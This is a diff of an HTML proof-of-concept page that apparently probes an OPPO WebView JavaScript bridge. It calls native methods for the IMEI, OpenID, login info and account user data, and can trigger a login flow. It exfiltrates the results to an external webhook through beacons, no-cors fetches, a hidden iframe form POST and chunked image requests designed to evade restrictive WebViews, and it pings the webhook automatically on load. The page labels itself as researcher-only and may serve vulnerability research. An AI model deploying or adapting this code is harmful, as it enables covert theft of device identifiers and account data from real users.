@@ -2,28 +2,130 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge RAW Sensitive Probe v3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>OPPO WebBridge Mobile Probe v5</title>
   <style>
-    body { font-family: sans-serif; padding: 24px; background:#000; color:#eee; }
-    pre { background: #f3f3f3; color:#111; padding: 16px; white-space: pre-wrap; word-break: break-word; }
-    .warn { color: #ff3355; font-weight: bold; }
-    button { padding: 10px 16px; margin: 8px 8px 8px 0; }
+    :root {
+      --bg: #050505;
+      --panel: #151515;
+      --panel2: #202020;
+      --text: #f2f2f2;
+      --muted: #b8b8b8;
+      --accent: #42d392;
+      --warn: #ff4f70;
+      --bad: #ff9f43;
+      --line: #3a3a3a;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+      --sans: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 18px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 18px;
+      line-height: 1.45;
+    }
+    h1 { font-size: 28px; margin: 0 0 8px 0; }
+    h2 { font-size: 22px; margin: 18px 0 8px; }
+    .warn { color: var(--warn); font-weight: 800; }
+    .ok { color: var(--accent); font-weight: 800; }
+    .bad { color: var(--bad); font-weight: 800; }
+    .muted { color: var(--muted); }
+    .top {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      background: linear-gradient(180deg, #050505 85%, rgba(5,5,5,0));
+      padding-bottom: 10px;
+    }
+    .buttons { display: flex; gap: 10px; flex-wrap: wrap; margin: 12px 0; }
+    button {
+      font-size: 17px;
+      font-weight: 700;
+      padding: 12px 14px;
+      border: 1px solid #555;
+      border-radius: 10px;
+      background: #f0f0f0;
+      color: #111;
+      min-height: 48px;
+    }
+    button.primary { background: var(--accent); color:#07120b; border-color: var(--accent); }
+    button.danger { background: #ffdadf; color:#5b0010; border-color: #ff8da0; }
+    #status {
+      border: 1px solid var(--line);
+      background: var(--panel);
+      padding: 12px;
+      border-radius: 12px;
+      font-family: var(--mono);
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-size: 16px;
+    }
+    .grid { display: grid; grid-template-columns: 1fr; gap: 12px; }
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      padding: 14px;
+      overflow-wrap: anywhere;
+    }
+    .card.good { border-color: #2ecc71; }
+    .card.empty { border-color: #555; opacity: 0.92; }
+    .card.fail { border-color: #ff9f43; }
+    .kv { font-family: var(--mono); font-size: 16px; margin: 4px 0; white-space: pre-wrap; word-break: break-word; }
+    .bigResult {
+      font-family: var(--mono);
+      font-size: 18px;
+      color: #fff;
+      background: var(--panel2);
+      border-radius: 8px;
+      padding: 10px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    pre {
+      background: #f2f2f2;
+      color: #111;
+      padding: 12px;
+      border-radius: 12px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-size: 14px;
+      line-height: 1.25;
+      max-height: 60vh;
+      overflow: auto;
+    }
+    details { margin: 12px 0; }
+    summary { cursor:pointer; font-weight: 800; }
+    .small { font-size: 14px; }
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge RAW Sensitive Probe v3</h1>
-<p class="warn">
-  RAW mode: full returned values are displayed locally and also sent to the configured researcher webhook.
-</p>
+<div class="top">
+  <h1>OPPO WebBridge Mobile Probe v5</h1>
+  <div class="warn">RAW mode for researcher-owned test device. This page prioritizes large readable phone output and short webhook pings/chunks.</div>
+  <div class="buttons">
+    <button class="primary" onclick="pingWebhook('manual_ping')">Ping webhook</button>
+    <button onclick="runFullRawProbe('manual_raw_button')">RAW sensitive probe</button>
+    <button class="primary" onclick="tryDispatcherReadonly('manual_dispatcher_readonly_button')">Dispatcher readonly APIs</button>
+    <button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Indirect native API</button>
+    <button onclick="tryClipboardMarker('manual_clipboard_button')">Clipboard marker</button>
+    <button onclick="tryStartLogin('manual_start_login_button')">doStartLogin</button>
+    <button onclick="toggleJson()">Toggle full JSON</button>
+  </div>
+  <div id="status">WAITING</div>
+</div>
 
-<button onclick="runFullRawProbe('manual_raw_button')">Run RAW sensitive probe</button>
-<button onclick="tryStartLogin('manual_start_login_button')">Try doStartLogin</button>
-<button onclick="tryClipboardMarker('manual_clipboard_button')">Try clipboard marker</button>
-<button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Try indirect callNativeApi/callAsyncNativeApi</button>
-<button onclick="tryDispatcherReadonly('manual_dispatcher_readonly_button')">Try dispatcher readonly account APIs</button>
+<h2>Readable results</h2>
+<div id="cards" class="grid"></div>
 
-<p id="status">WAITING</p>
-<pre id="out"></pre>
+<details id="jsonDetails">
+  <summary>Full JSON</summary>
+  <pre id="out"></pre>
+</details>
 
 <script>
 (function () {
@@ -31,22 +133,25 @@
   const RAW_TO_WEBHOOK = true;
 
   const RAW_METHODS = [
-    "getImei",
-    "getOpenId",
-    "getLoginInfo",
-    "isLogin",
-    "getChannelId",
-    "getPackageName",
-    "getDeviceModel",
-    "getNetworkType",
-    "getRomVersion",
-    "getRomVersionCode",
-    "getStatusBarHeight",
-    "isInstalled",
-    "isSupportShake",
-    "getProgress",
-    "getButtonStatus"
+    "getImei", "getOpenId", "getLoginInfo", "isLogin", "getChannelId",
+    "getPackageName", "getDeviceModel", "getNetworkType", "getRomVersion",
+    "getRomVersionCode", "getStatusBarHeight", "isInstalled", "isSupportShake",
+    "getProgress", "getButtonStatus"
   ];
+
+  const READONLY_ACTIONS = [
+    "account_islogin",
+    "account_get_userid",
+    "account_get_userinfo",
+    "get_open_id",
+    "get_imei",
+    "get_channel_id",
+    "get_package_name",
+    "get_device_model",
+    "get_network_type"
+  ];
+
+  function $(id) { return document.getElementById(id); }
 
   function safeString(x) {
     try {
@@ -60,6 +165,10 @@
     }
   }
 
+  function isEmptyValue(raw) {
+    return raw.length === 0 || raw === "undefined" || raw === "null" || raw === "\"\"";
+  }
+
   function describeAndroidObject() {
     const a = window.android;
     if (!a || typeof a !== "object") return { exists: false, type: typeof a };
@@ -67,7 +176,7 @@
     let ownKeys = [];
     let functionKeys = [];
     try {
-      ownKeys = Object.getOwnPropertyNames(a).slice(0, 160);
+      ownKeys = Object.getOwnPropertyNames(a).slice(0, 180);
       functionKeys = ownKeys.filter(k => {
         try { return typeof a[k] === "function"; } catch (e) { return false; }
       });
@@ -100,20 +209,52 @@
         item.error = "window.android missing";
         return item;
       }
-
       item.exists = typeof a[method] === "function";
       if (!item.exists) {
         item.error = "missing_or_not_function";
         return item;
       }
-
       const ret = a[method].apply(a, args || []);
       const raw = safeString(ret);
-
       item.ok = true;
       item.returnType = typeof ret;
       item.rawReturnValue = raw;
-      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
+      item.empty = isEmptyValue(raw);
+      return item;
+    } catch (e) {
+      item.error = String(e && (e.stack || e.message || e));
+      return item;
+    }
+  }
+
+  function callBridgeRaw(method, arg) {
+    const item = {
+      bridgeMethod: method,
+      arg,
+      exists: false,
+      ok: false,
+      returnType: null,
+      rawReturnValue: null,
+      empty: null,
+      error: null
+    };
+    try {
+      const a = window.android;
+      if (!a || typeof a !== "object") {
+        item.error = "window.android missing";
+        return item;
+      }
+      item.exists = typeof a[method] === "function";
+      if (!item.exists) {
+        item.error = "missing_or_not_function";
+        return item;
+      }
+      const ret = a[method](arg);
+      const raw = safeString(ret);
+      item.ok = true;
+      item.returnType = typeof ret;
+      item.rawReturnValue = raw;
+      item.empty = isEmptyValue(raw);
       return item;
     } catch (e) {
       item.error = String(e && (e.stack || e.message || e));
@@ -124,7 +265,7 @@
   function basePayload(eventType, reason) {
     return {
       eventType,
-      version: "raw_sensitive_v3",
+      version: "mobile_readable_v5",
       ts: new Date().toISOString(),
       reason,
       safetyBoundary: {
@@ -149,18 +290,67 @@
     };
   }
 
+  function short(v, n) {
+    const s = safeString(v);
+    return s.length > n ? s.slice(0, n) + "...[truncated]" : s;
+  }
+
+  function imgGet(path, params) {
+    try {
+      const qs = Object.entries(params).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(safeString(v))).join("&");
+      const img = new Image();
+      img.referrerPolicy = "no-referrer";
+      img.src = WEBHOOK + path + "?" + qs;
+      return true;
+    } catch (e) { return false; }
+  }
+
+  function formPost(path, fields) {
+    try {
+      let iframe = document.getElementById("hiddenWebhookFrame");
+      if (!iframe) {
+        iframe = document.createElement("iframe");
+        iframe.name = "hiddenWebhookFrame";
+        iframe.id = "hiddenWebhookFrame";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+      }
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = WEBHOOK + path;
+      form.target = "hiddenWebhookFrame";
+      form.enctype = "text/plain";
+      Object.entries(fields).forEach(([k, v]) => {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = k;
+        input.value = safeString(v);
+        form.appendChild(input);
+      });
+      document.body.appendChild(form);
+      form.submit();
+      setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
+      return true;
+    } catch (e) { return false; }
+  }
+
   function sendWebhook(payload) {
     const json = JSON.stringify(payload);
+    const event = payload.eventType || "UNKNOWN";
+
+    // Always send tiny pings first. These should be visible even if the large body is dropped.
+    imgGet("/v5-ping", { event, t: Date.now(), bridge: !!window.android, ua: navigator.userAgent.slice(0, 120) });
+    imgGet("/v5-summary", { event, t: Date.now(), reason: payload.reason, href: location.href.slice(0, 180), jsonLen: json.length });
 
     try {
       navigator.sendBeacon(
-        WEBHOOK + "/oppo-sensitive-raw-beacon",
+        WEBHOOK + "/v5-beacon",
         new Blob([json], { type: "text/plain" })
       );
     } catch (e) {}
 
     try {
-      fetch(WEBHOOK + "/oppo-sensitive-raw-post", {
+      fetch(WEBHOOK + "/v5-fetch-post", {
         method: "POST",
         mode: "no-cors",
         headers: { "content-type": "text/plain" },
@@ -168,26 +358,84 @@
       }).catch(function(){});
     } catch (e) {}
 
-    try {
-      const encoded = encodeURIComponent(json).slice(0, 7500);
-      new Image().src =
-        WEBHOOK +
-        "/oppo-sensitive-raw-get?event=" +
-        encodeURIComponent(payload.eventType) +
-        "&t=" + Date.now() +
-        "&d=" + encoded;
-    } catch (e) {}
+    formPost("/v5-form-post", { event, t: Date.now(), payload: json.slice(0, 60000) });
+
+    // Chunk the raw payload into short GETs. This is the most visible fallback in restrictive WebViews.
+    const chunkSize = 1400;
+    const maxChunks = Math.min(30, Math.ceil(json.length / chunkSize));
+    for (let i = 0; i < maxChunks; i++) {
+      imgGet("/v5-chunk", {
+        event,
+        t: Date.now(),
+        i,
+        n: maxChunks,
+        d: json.slice(i * chunkSize, (i + 1) * chunkSize)
+      });
+    }
+  }
+
+  function resultToCard(r, idx) {
+    const method = r.method || r.bridgeMethod || ("result_" + idx);
+    const arg = r.arg !== undefined ? r.arg : (r.args ? JSON.stringify(r.args) : "");
+    const raw = r.rawReturnValue === null || r.rawReturnValue === undefined ? "" : String(r.rawReturnValue);
+    const cls = r.ok ? (r.empty ? "empty" : "good") : "fail";
+    const verdict = r.ok ? (r.empty ? "OK_EMPTY" : "OK_NON_EMPTY") : "FAIL";
+    return `<div class="card ${cls}">
+      <div class="kv"><b>#${idx + 1} ${escapeHtml(method)}</b> <span class="${r.ok ? (r.empty ? 'bad' : 'ok') : 'bad'}">${verdict}</span></div>
+      <div class="kv">returnType: ${escapeHtml(r.returnType)}</div>
+      ${arg ? `<div class="kv">arg: ${escapeHtml(short(arg, 700))}</div>` : ""}
+      ${r.error ? `<div class="kv bad">error: ${escapeHtml(short(r.error, 900))}</div>` : ""}
+      <div class="bigResult">${escapeHtml(short(raw, 1600))}</div>
+    </div>`;
+  }
+
+  function escapeHtml(s) {
+    return String(s === null || s === undefined ? "" : s)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/\"/g, "&quot;")
+      .replace(/'/g, "&#039;");
+  }
+
+  function renderCards(payload) {
+    const cards = [];
+    cards.push(`<div class="card">
+      <div class="kv"><b>${escapeHtml(payload.eventType)}</b></div>
+      <div class="kv">ts: ${escapeHtml(payload.ts)}</div>
+      <div class="kv">reason: ${escapeHtml(payload.reason)}</div>
+      <div class="kv">androidBridge.exists: <span class="${payload.androidBridge && payload.androidBridge.exists ? 'ok' : 'bad'}">${payload.androidBridge && payload.androidBridge.exists}</span></div>
+      <div class="kv">UA: ${escapeHtml(short(navigator.userAgent, 240))}</div>
+    </div>`);
+
+    const results = payload.results || (payload.result ? [payload.result] : []);
+    const nonEmpty = results.filter(r => r && r.ok && r.empty === false);
+    if (nonEmpty.length) {
+      cards.push(`<div class="card good"><b>NON-EMPTY RESULTS: ${nonEmpty.length}</b><br>${escapeHtml(nonEmpty.map(r => r.method || r.bridgeMethod).join(', '))}</div>`);
+    } else if (results.length) {
+      cards.push(`<div class="card empty"><b>No non-empty result in this run.</b></div>`);
+    }
+    results.forEach((r, i) => cards.push(resultToCard(r, i)));
+    $("cards").innerHTML = cards.join("\n");
   }
 
   function renderAndSend(payload) {
-    document.getElementById("status").textContent =
-      payload.eventType + ": " + payload.ts;
-
-    document.getElementById("out").textContent =
-      JSON.stringify(payload, null, 2);
-
+    $("status").textContent = payload.eventType + "\n" + payload.ts + "\nbridge=" + (payload.androidBridge && payload.androidBridge.exists) + "\nWebhook pings/chunks attempted.";
+    $("out").textContent = JSON.stringify(payload, null, 2);
+    renderCards(payload);
     sendWebhook(payload);
   }
+
+  window.toggleJson = function() {
+    const d = $("jsonDetails");
+    d.open = !d.open;
+  };
+
+  window.pingWebhook = function(reason) {
+    const payload = basePayload("OPPO_V5_WEBHOOK_PING", reason);
+    payload.note = "If webhook.site receives /v5-ping or /v5-summary, transport works.";
+    renderAndSend(payload);
+  };
 
   window.runFullRawProbe = function(reason) {
     const payload = basePayload("OPPO_SENSITIVE_RAW_RESULT", reason);
@@ -198,7 +446,7 @@
   window.tryStartLogin = function(reason) {
     const payload = basePayload("OPPO_START_LOGIN_RESULT", reason);
     payload.result = callBridge("doStartLogin", []);
-    payload.note = "If a login/account UI is opened by attacker-controlled web content, this is a high-value native-action sink even if no raw ID is returned.";
+    payload.note = "State-changing / login UI validation. Use only on researcher-owned device.";
     renderAndSend(payload);
   };
 
@@ -237,109 +485,34 @@
     renderAndSend(payload);
   };
 
-
-  function sendDispatcherWebhook(payload) {
-    const json = JSON.stringify(payload);
-
-    try {
-      navigator.sendBeacon(
-        WEBHOOK + "/oppo-dispatcher-readonly-result",
-        new Blob([json], { type: "text/plain" })
-      );
-    } catch (e) {}
-
-    try {
-      fetch(WEBHOOK + "/oppo-dispatcher-readonly-post", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "content-type": "text/plain" },
-        body: json
-      }).catch(function(){});
-    } catch (e) {}
-
-    try {
-      const encoded = encodeURIComponent(json).slice(0, 7500);
-      new Image().src =
-        WEBHOOK +
-        "/oppo-dispatcher-readonly-get?event=" +
-        encodeURIComponent(payload.eventType) +
-        "&t=" + Date.now() +
-        "&d=" + encoded;
-    } catch (e) {}
-  }
-
   window.tryDispatcherReadonly = function(reason) {
     const payload = basePayload("OPPO_DISPATCHER_READONLY_RESULT", reason);
-
-    const actions = [
-      "account_islogin",
-      "account_get_userid",
-      "account_get_userinfo",
-      "get_open_id",
-      "get_imei",
-      "get_channel_id",
-      "get_package_name",
-      "get_device_model",
-      "get_network_type"
-    ];
-
     const candidates = [];
-
-    for (const actionName of actions) {
-      candidates.push({ type: actionName });
-      candidates.push({ action: actionName });
-      candidates.push({ method: actionName });
-      candidates.push({ name: actionName });
-      candidates.push({ id: actionName });
-      candidates.push({ type: actionName, data: {} });
-      candidates.push({ action: actionName, data: {} });
-      candidates.push({ method: actionName, data: {} });
-      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, data: {} });
-      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, data: {} });
-      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, params: {} });
-      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, params: {} });
+    for (const a of READONLY_ACTIONS) {
+      candidates.push({ type: a });
+      candidates.push({ action: a });
+      candidates.push({ method: a });
+      candidates.push({ name: a });
+      candidates.push({ id: a });
+      candidates.push({ type: a, data: {} });
+      candidates.push({ action: a, data: {} });
+      candidates.push({ id: "oppo_audit_" + a, type: a, data: {} });
+      candidates.push({ id: "oppo_audit_" + a, type: a, params: {} });
     }
-
-    payload.scope = {
-      description: "Read-only dispatcher probe for account/device metadata actions only.",
-      stateChangingActionsSkipped: [
-        "account_start_login",
-        "reLoginAccount",
-        "download_open",
-        "download_start",
-        "download_pause",
-        "download_cancel",
-        "startPay",
-        "openActivity",
-        "openWebView"
-      ],
-      bridgeMethodsTested: ["callNativeApi", "callAsyncNativeApi"]
-    };
-
-    payload.candidateCount = candidates.length;
-    payload.results = [];
-
-    for (const candidate of candidates) {
-      const arg = JSON.stringify(candidate);
-      payload.results.push(callBridge("callNativeApi", [arg]));
-      payload.results.push(callBridge("callAsyncNativeApi", [arg]));
+    const results = [];
+    for (const c of candidates) {
+      const arg = JSON.stringify(c);
+      results.push(callBridgeRaw("callNativeApi", arg));
+      results.push(callBridgeRaw("callAsyncNativeApi", arg));
     }
-
-    document.getElementById("status").textContent =
-      payload.eventType + ": " + payload.ts;
-
-    document.getElementById("out").textContent =
-      JSON.stringify(payload, null, 2);
-
-    sendWebhook(payload);
-    sendDispatcherWebhook(payload);
+    payload.results = results;
+    renderAndSend(payload);
   };
 
   setTimeout(function () {
-    runFullRawProbe("auto_after_load_1200ms");
-  }, 1200);
+    pingWebhook("auto_ping_after_load_600ms");
+  }, 600);
 })();
 </script>
 </body>
 </html>
-HTML
